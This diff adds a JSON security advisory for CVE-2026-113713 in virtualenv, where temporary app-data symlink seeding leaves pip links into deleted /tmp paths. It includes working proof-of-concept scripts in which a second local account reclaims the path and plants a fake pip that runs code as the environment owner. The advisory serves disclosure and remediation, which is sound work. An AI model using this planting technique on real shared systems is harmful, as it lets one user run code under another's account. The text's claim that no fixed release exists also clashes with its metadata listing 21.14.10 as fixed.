@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-4f8h-vr72-p32c",
+  "modified": "2026-10-23T22:45:03.445316885Z",
+  "published": "2026-10-23T22:26:57Z",
+  "aliases": [
+    "CVE-2026-113713"
+  ],
+  "summary": "virtualenv: Temporary app-data can leave dangling seed package links",
+  "details": "## Summary\n\nThe app-data seeder can leave an environment linked to temporary package files that virtualenv deletes when creation\nfinishes. The environment-variable and configuration-file forms of `symlink_app_data` can enable this state even though\nthe command-line flag is disabled for temporary app-data. The resulting environment depends on a cache pathname that its\nowner no longer controls.\n\nAnthropic's OSS Scanner reported this as `ANT-2026-ZOE2GEPC` in `virtualenv-20261015-005`, received on 15 October 2026.\nThis draft records source review and functional remediation checks. The reporter's cross-account code-execution claim\nhas not been independently reproduced.\n\n## Affected area\n\nIntegrity of app-data references after temporary cache cleanup.\n\n## Attacker-controlled input\n\nSymlink seeding must be enabled through `VIRTUALENV_SYMLINK_APP_DATA` or `symlink_app_data` in the configuration file,\nand app-data setup must fall back to a temporary directory. A missing or unwritable configured cache can cause that\nfallback. Ordinary copy seeding does not leave these references.\n\nThe security concern requires a shared temporary-directory parent where another account can acquire the deleted cache\npathname, followed by use of the affected environment. That account need not already be able to modify the environment\nor the private cache while it exists. This differs from the security policy's excluded case of an account that already\ncontrols live app-data contents. On a platform with a temporary-directory parent private to the environment owner, that\ncross-account condition is absent. Windows functional checks do not establish cross-account exposure under Windows\ndefaults.\n\n## Affected code\n\nThe relevant 21.14.8 source is in\n[symlink seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/via_app_data.py),\n[temporary cache cleanup](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/app_data/via_tempdir.py).\n\n## Mechanism\n\nWhen app-data setup falls back to a temporary directory, the command-line `--symlink-app-data` action is disabled. A\nvalue supplied by `VIRTUALENV_SYMLINK_APP_DATA` or `virtualenv.ini` can still become the parser default, and the seeder\nconstructor accepts that value without rechecking the cache lifetime. It links `site-packages/pip` into the temporary\ncache. Session cleanup deletes that cache, leaving a dangling link whose pathname can later be claimed by another\naccount on a shared temporary filesystem.\n\n## Reproduction and evidence\n\nThe scanner ran its reproduction as two unprivileged users, with root used only to switch identities. The environment\nowner had an unwritable home, so app-data fell back to `/tmp`. The control used the command-line flag and received a\nreal pip directory. With `VIRTUALENV_SYMLINK_APP_DATA=1`, the new environment instead contained a `pip` link into a\ndeleted `/tmp/tmpXXXXXXXX` directory. A second uid recreated the target path and placed a fake `pip/__init__.py` there.\nWhen the owner ran `venv/bin/pip --version`, that module created a marker inside the owner's environment and printed\n`this is not pip`.\n\nThe cross-account path requires a shared temporary parent, a second account able to claim the deleted name, and later\nuse of the environment. A private temporary parent removes that route. The report traces the incomplete temporary-cache\nguard to #1661, first released in 20.0.6.\n[Public fix PR #3437](https://github.com/pypa/virtualenv/pull/3437) copies packages whenever app-data is\ntemporary, whatever supplied the symlink option. The implementation review checked the remediation; it did not rerun the\ncross-account reproduction.\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant U as Environment owner\n    participant V as virtualenv seeder\n    participant T as Temporary app-data in /tmp\n    participant E as site-packages/pip link\n    participant A as Other local account\n    U-\u003e\u003eV: VIRTUALENV_SYMLINK_APP_DATA=1 with unwritable home\n    V-\u003e\u003eT: create transient cache\n    V-\u003e\u003eE: link pip to cache path\n    V-\u003e\u003eT: delete cache at session exit\n    A-\u003e\u003eT: reclaim old name and plant fake pip\n    U-\u003e\u003eE: run bin/pip --version\n    E-\u003e\u003eT: import fake pip through stale link\n    T--\u003e\u003eU: attacker's code runs as owner\n```\n\n## Reproducer files\n\nThe following files are from the scanner report for `ANT-2026-ZOE2GEPC`. They were tested against commit `a857a7823c73`\nin the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\nneed a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\nare included as evidence and were not rerun for this advisory update.\n\n**`repro`**\n\n```text\n#!/usr/bin/env python3\nimport os\nimport pwd\nimport shutil\nimport subprocess\nfrom pathlib import Path\n\nowner = pwd.getpwnam(\"nobody\")  # home is /nonexistent: app-data cannot be created, so virtualenv uses a temporary one\nother_user_uid = 4242\nproject = Path(\"/srv/project\")\nother_user_files = Path(\"/var/tmp/other-user\")\n\n# set up: a project folder only the owner can write, and the other user's two files in a folder of their own\nshutil.rmtree(project, ignore_errors=True)\nshutil.rmtree(other_user_files, ignore_errors=True)\nproject.mkdir(mode=0o755)\nos.chown(project, owner.pw_uid, owner.pw_gid)\nshutil.copytree(\"/tmp/repro.d\", other_user_files)\nsubprocess.run([\"chown\", \"-R\", f\"{other_user_uid}:{other_user_uid}\", other_user_files], check=True)\n\nas_owner = {\"user\": owner.pw_uid, \"group\": owner.pw_gid, \"extra_groups\": [], \"cwd\": project}\nas_other_user = {\"user\": other_user_uid, \"group\": other_user_uid, \"extra_groups\": [], \"cwd\": \"/\"}\nowner_env = {\"HOME\": owner.pw_dir, \"PATH\": os.environ[\"PATH\"]}\nvirtualenv = [\"virtualenv\", \"--quiet\", \"--no-periodic-update\"]\n\n# control: --symlink-app-data on the command line is dropped while app-data is temporary, so pip is copied\nsubprocess.run([*virtualenv, \"--symlink-app-data\", \"control\"], env=owner_env, check=True, **as_owner)\ncontrol_pip = next(project.glob(\"control/lib/python*/site-packages/pip\"))\nprint(f\"CONTROL  --symlink-app-data:            {control_pip} is a symlink: {control_pip.is_symlink()}\")\n\n# trigger: the same setting through the environment variable\nsymlink_env = {**owner_env, \"VIRTUALENV_SYMLINK_APP_DATA\": \"1\"}\nsubprocess.run([*virtualenv, \"venv\"], env=symlink_env, check=True, **as_owner)\nvenv_pip = next(project.glob(\"venv/lib/python*/site-packages/pip\"))\nprint(f\"OBSERVED VIRTUALENV_SYMLINK_APP_DATA=1: {venv_pip} is a symlink: {venv_pip.is_symlink()}\")\n\n# attack: the other user re-creates the deleted folder the link points into\nif venv_pip.is_symlink():\n    print(f\"OBSERVED it points to {os.readlink(venv_pip)}, which exists: {venv_pip.exists()}\")\n    subprocess.run([\"python3\", other_user_files / \"plant_fake_pip.py\", venv_pip], check=True, **as_other_user)\n\n# the owner uses their environment\npip_version = subprocess.run([project / \"venv/bin/pip\", \"--version\"], env=owner_env, capture_output=True, text=True, **as_owner)\nprint(f\"OBSERVED venv/bin/pip --version, run by uid {owner.pw_uid}, printed: {(pip_version.stdout + pip_version.stderr).strip()}\")\n\n# check: fake_pip.py writes this file into the environment folder, which uid 4242 cannot write\nvenv_stat = os.stat(project / \"venv\")\nprint(f\"OBSERVED {project / 'venv'} has mode {oct(venv_stat.st_mode \u0026 0o777)} and owner uid {venv_stat.st_uid}\")\nproof = project / \"venv/attacker-code-ran\"\nprint(f\"OBSERVED {proof} exists: {proof.exists()}\")\nif proof.exists():\n    print(f\"OBSERVED it is owned by uid {proof.stat().st_uid} and says: {proof.read_text()}\")\nprint(\"BUG\" if proof.exists() and proof.stat().st_uid == owner.pw_uid else \"OK\")\n```\n\n**`repro.d/fake_pip.py`**\n\n```text\n# planted as pip/__init__.py: runs in whichever process imports pip\nimport os\nimport sys\n\nwith open(os.path.join(sys.prefix, \"attacker-code-ran\"), \"w\") as proof:\n    proof.write(f\"{os.path.realpath(__file__)}, owned by uid {os.stat(__file__).st_uid}, was imported by uid {os.getuid()}\")\n\nsys.exit(\"this is not pip\")\n```\n\n**`repro.d/plant_fake_pip.py`**\n\n```text\nimport os\nimport shutil\nimport sys\nfrom pathlib import Path\n\ndangling_link = sys.argv[1]  # the environment is world-readable, so anyone can read where its links go\ndeleted_folder = Path(os.readlink(dangling_link))\n\n# virtualenv deleted /tmp/tmpXXXXXXXX when it exited, so the name is free for anyone to take\ndeleted_folder.mkdir(parents=True)\nshutil.copy(Path(__file__).with_name(\"fake_pip.py\"), deleted_folder / \"__init__.py\")\n```\n\n## Impact\n\nSeed packages become unavailable after temporary-cache cleanup. With a shared temporary-directory parent, a later\npackage load can follow the stale cache reference into a pathname another account has acquired. A private\ntemporary-directory parent prevents that cross-account condition.\n\nSeverity: low.\n\n## Versions tested\n\nThe reproduced release is 21.14.8. The vulnerable seeder path is unchanged in 21.14.9. The affected range starts at\n21.14.8, the first release confirmed here; earlier releases may also be affected. No fixed release is available.\n\nThe reporter identifies 20.0.6 as the first affected release. Commit\n[c3453b6c](https://github.com/pypa/virtualenv/commit/c3453b6c381d28377c8e0115bf1124b2ca7b3c2b), first included in\n20.0.6, contains the incomplete transient-cache guard. Historical runtime behavior across that range remains unverified.\n\nThe proposed fix copies seed packages whenever app-data is temporary, including when symlink seeding was selected\nthrough environment variables or configuration. The environment then remains usable after cache cleanup.\n\nProposed fix: [PR #3437](https://github.com/pypa/virtualenv/pull/3437).\n\n## Known mitigation\n\nThe proposed fix is in [public PR #3437](https://github.com/pypa/virtualenv/pull/3437).\n\nThe fix checks the selected app-data lifetime in the seeder constructor and always copies from temporary app-data,\nregardless of where the symlink option came from. Persistent caches retain symlink seeding.\n\nUntil a fixed release is available, disable symlink seeding in configuration and environment variables, or provide a\nwritable persistent cache private to the environment owner. Recreate affected environments after correcting those\nsettings. No fixed release is available yet.\n\n## Affected release\n\n- [x] The problem reproduces on virtualenv 21.14.8. The same vulnerable code remains in 21.14.9.\n\n## Credits\n\nReported by Anthropic's OSS Scanner as ANT-2026-ZOE2GEPC.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "virtualenv",
+        "purl": "pkg:pypi/virtualenv"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "21.14.8"
+            },
+            {
+              "fixed": "21.14.10"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "21.14.8",
+        "21.14.9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-4f8h-vr72-p32c/GHSA-4f8h-vr72-p32c.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/virtualenv/security/advisories/GHSA-4f8h-vr72-p32c"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-113713"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/virtualenv/pull/3437"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/virtualenv/commit/b81995c3feab9e1edb453c75ffc6616e1a77335e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pypa/virtualenv"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/virtualenv/releases/tag/21.14.10"
+    }
+  ]
+}
